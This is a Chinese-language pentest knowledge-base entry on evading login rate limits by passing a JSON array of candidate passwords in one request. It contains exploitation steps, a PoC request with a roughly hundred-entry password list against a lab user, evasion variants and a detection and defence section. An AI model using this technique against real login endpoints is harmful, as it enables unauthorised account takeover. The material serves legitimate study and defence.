---
id: web-generic-auth-password-array-bypass-rate-limit
title: 密码参数传 JSON 数组绕过登录频次限制：一次请求校验多个候选口令
type: scenario
domain: web
path: web/generic/auth
technique: password-array-multiple-credentials-one-request
tags:
- auth
- bruteforce
- rate-limit
- json
- array
- bypass
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V600
  verified_at: '2026-11-12T17:08:35+08:00'
  notes: 已对照原文与截图核对：password传JSON数组单请求返回302 Location:/my-account?id=carlos并登录成功(14/15/16图)与PoC一致；与cookie-xff、XML-RPC multicall机制不同非同链；未验证点：未复现
url: /docs/web/generic/auth/web-generic-auth-password-array-bypass-rate-limit/
draft: false
kb_aliases:
- 密码数组绕过
- multiple credentials per request
- JSON 数组爆破
- 单请求多口令
- password 数组
---

## 一句话结论

当登录接口把 `password` 字段按数组/列表解析并逐个与用户口令比较，而限速只按 HTTP 请求次数计数时，攻击者可以把整个候选口令字典塞进一个 JSON 数组，在一次请求内完成数百次口令尝试，命中任意一个即登录成功，从而绕过频次限制。

## 原理

- 框架的类型绑定常允许同一字段为数组（如 JSON `"password": ["a","b",...]` 绑定到 `List<String>`/`string[]`）。若后端代码写成“遍历数组，逐个比较，任一匹配即通过”，一个请求就会执行多次口令校验。
- 限速/风控通常挂在请求入口，按请求数（或按 IP 的请求速率）计数，不会按数组元素个数计数；于是数百次口令尝试只消耗 1 次配额。
- 命中时服务端返回正常的登录成功响应（302 + Set-Cookie），攻击者跟随跳转即得以目标身份登录；失败时返回 200 错误页。响应状态/长度/跳转位置可作为命中判定。
- 该缺陷的本质是“客户端可控的复合类型”绕过了“单次请求只尝试一个口令”的隐含假设。

## 触发条件

- 登录接口接受 JSON（或能绑定数组的表单参数），且服务端对 `password`/`pass` 字段做数组遍历校验。
- 限速/锁定按请求次数或 IP 请求速率统计，不按实际口令比较次数统计。
- 目标用户名已知，且服务端在命中任一候选口令后正常建立会话。
- 请求体大小未被 WAF/网关严格限制（数组可分批）。

## 利用步骤

1. 抓取正常登录请求，确认 `Content-Type: application/json` 与字段结构。
2. 把 `password` 的单字符串值替换为候选口令数组（数十到数百条，按请求体上限分批）。
3. 发送请求，观察是否返回 `302 Found` 且 `Location: /my-account?id=<target>`、`Set-Cookie: session=...`。
4. 右键“Show response in browser”，复制跳转 URL 在浏览器中打开，即以目标身份登录。
5. 若数组被类型校验拒绝，尝试嵌套数组、对象值、逗号分隔字符串，或改用表单多值参数 `password=a&password=b`。
6. 分批时保持每次请求的数组规模在服务端解析限制内。

## PoC

```http
POST /login HTTP/1.1
Host: target
Content-Type: application/json
Cookie: session=<own-session>

{"username":"carlos","password":["123456","password","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","12345678","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]}
```

```http
HTTP/1.1 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=...
```

- 原文实测密码数组包含上百个候选，单次请求即返回 302 并成功以 carlos 登录。

## 变体与关联

- 用户名同样传入数组（`"username":["a","b"]`）可与密码数组组合扩大尝试面。
- 表单接口可尝试重复参数 `username=carlos&password=a&password=b`；不同框架对重复参数的处理不同。
- 同类“单请求打包多次尝试”思路见 [[pentest-initial-access-wordpress-xmlrpc-multicall-bruteforce]]（XML-RPC multicall，机制不同）。
- 边界：若服务端严格校验 password 必须为 string，或 WAF 拦截数组结构，则该方法失效。

## 检测与防御

- 检测：登录请求体出现 `password` 为数组/对象；单请求包含大量口令候选；同一账号在单请求内多次比较的时间特征。
- 防御：对 password 做严格类型校验（必须是单一字符串），拒绝数组/对象；限速按账号 + 实际校验次数统计；WAF 对登录请求体做结构白名单。
